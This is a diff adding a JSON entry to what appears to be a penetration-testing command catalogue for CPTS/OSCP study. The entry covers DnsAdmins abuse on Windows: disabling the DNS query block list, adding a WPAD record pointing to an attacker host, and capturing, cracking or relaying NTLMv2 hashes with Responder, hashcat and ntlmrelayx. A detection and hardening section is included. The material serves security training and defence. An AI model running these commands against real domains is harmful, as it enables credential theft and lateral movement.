@@ -1,0 +1,86 @@
+{
+  "type": "command",
+  "platform": "windows",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [],
+  "tools": [
+    "powershell"
+  ],
+  "tags": [
+    "dnsadmins",
+    "wpad",
+    "mitm"
+  ],
+  "category": "Privilege Escalation",
+  "subcategory": "Windows - DnsAdmins",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 26: Windows Privilege Escalation",
+  "examples": [
+    {
+      "label": "Disable the global query block list",
+      "command": "Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local"
+    },
+    {
+      "label": "Add a WPAD record pointing at your host",
+      "command": "Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3"
+    }
+  ],
+  "notes": "=== DnsAdmins — WPAD Record for Credential Capture ===\nLess destructive alternative: create WPAD DNS record to capture NTLMv2 hashes.\n\n=== WHY WPAD MATTERS ===\nClients with automatic proxy discovery send all traffic through the WPAD proxy URL.\nThey resolve wpad.<domain> via DNS first.\nAttacker controls DNS record → traffic proxied through attacker host.\nResponder/Inveigh on that host → NTLMv2 hashes from all proxied connections.\n\n=== GLOBAL QUERY BLOCK LIST ===\nWindows DNS blocks WPAD and ISATAP records by default to prevent this exact attack.\nDnsAdmins can disable this protection:\n  Get-DnsServerGlobalQueryBlockList   → see currently blocked names\n  Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01\n  Verify: Get-DnsServerGlobalQueryBlockList\n\n=== ATTACK FLOW ===\nStep 1: Disable WPAD block list (DnsAdmins required)\n  Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.domain.com\n\nStep 2: Create WPAD A record pointing to attacker\n  Add-DnsServerResourceRecordA -Name wpad -ZoneName <domain.com> -IPv4Address <ATTACKER_IP>\n  Verify: nslookup wpad.<domain.com>\n\nStep 3: Start Responder on attacker\n  sudo responder -I eth0 -wPv\n  -w = WPAD rogue server, -P = proxy authentication\n\nStep 4: Wait for clients to browse → NTLMv2 hashes captured in Responder output\n\nStep 5: Crack hashes\n  hashcat -m 5600 captured_hashes.txt /usr/share/wordlists/rockyou.txt\n\n=== COMPARISON VS DLL METHOD ===\nDLL method: immediate SYSTEM, disruptive (DNS outage risk), high-impact\nWPAD method: passive, non-disruptive, yields hashes that may require cracking\nChoose WPAD when: production environment, no authorization to stop DNS, stealth required\n\n=== CHAINING CONTEXT ===\nWPAD hash capture → crack → plaintext domain credentials → lateral movement\nHigh-privilege account browsing → their hash captured → priority crack target\nCaptured DA NTLMv2 → ntlmrelayx relay → immediate authentication without cracking\nWPAD + Responder also captures SMB hashes from clients accessing UNC paths",
+  "references": [
+    {
+      "title": "Abusing DnsAdmins (labofapenetrationtester)",
+      "url": "http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html"
+    },
+    {
+      "title": "HTB Academy - Windows Privilege Escalation",
+      "url": "https://academy.hackthebox.com/module/details/67"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "dnsadmins-dll",
+      "note": "Direct SYSTEM-exec DnsAdmins abuse via a plugin DLL.",
+      "rel": "alternative"
+    },
+    {
+      "id": "ad-dcom-exec",
+      "rel": "next",
+      "note": "Continue enumeration/technique in this area"
+    }
+  ],
+  "id": "dnsadmins-wpad",
+  "name": "DnsAdmins - WPAD Record Injection",
+  "command": "Add-DnsServerResourceRecordA -Name wpad -ZoneName <domain> -ComputerName <dc> -IPv4Address <lhost>",
+  "description": "Alternative DnsAdmins abuse: disable the Global Query Block List and add a WPAD record pointing at your host, so domain clients route proxy auto-config through you for credential capture / MITM.",
+  "opsec": "loud",
+  "mitre": [
+    "T1557"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "DnsAdmins can add resource records to DNS zones. Creating a WPAD (Web Proxy Auto-Discovery) A record pointing to an attacker-controlled host, after disabling the DNS global query block list that normally blocks WPAD, causes Windows clients configured for automatic proxy detection to request wpad.dat from the attacker's IP. This triggers NTLM authentication attempts capturable with Responder.",
+    "prerequisites": "DnsAdmins group membership. Ability to disable the Global Query Block List (GQBL). Responder/Inveigh on an attacker host at the WPAD record IP. Clients using automatic proxy detection.",
+    "impact": "NTLMv2 hash capture from any domain client that auto-discovers the proxy. Hashes can be cracked offline or relayed to authenticate as that user on other systems.",
+    "detection": "DNS record creation events (Event ID 770 in DNS Server debug log). GQBL modification via PowerShell. Unusual WPAD DNS record appearing. Network: HTTP requests for /wpad.dat from domain clients to non-standard IP.",
+    "artifacts": "DNS zone record: WPAD A record added | DNS audit log: record added by DnsAdmins member | Network: NTLM authentication attempts to attacker IP for WPAD",
+    "prevention": "Keep the DNS Global Query Block List enabled (default includes wpad and isatap). Audit DNS records for unexpected WPAD entries. Disable WPAD on clients via GPO (HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\WinHttp - DisableWpad). Require packet signing to mitigate NTLM relay.",
+    "misconfiguration": "DNS Global Query Block List disabled, allowing WPAD DNS record creation. Clients configured for automatic proxy detection. NTLM relay mitigations (SMB signing, LDAP signing) not enforced.",
+    "vulnerable_config": "# Disabling GQBL (allows WPAD record)\nSet-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local\n\n# Adding WPAD record pointing to attacker\nAdd-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -IPv4Address 10.10.14.3",
+    "secure_config": "# Ensure GQBL is enabled\nGet-DnsServerGlobalQueryBlockList  # should include wpad\nSet-DnsServerGlobalQueryBlockList -Enable $true\n\n# Disable WPAD on clients via GPO\n# HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\WinHttp\\DisableWpad = 1\n\n# Enforce SMB signing\nSet-SmbServerConfiguration -RequireSecuritySignature $true",
+    "sources": [
+      "HTB M26",
+      "MITRE T1557.001",
+      "MITRE T1040"
+    ]
+  }
+}
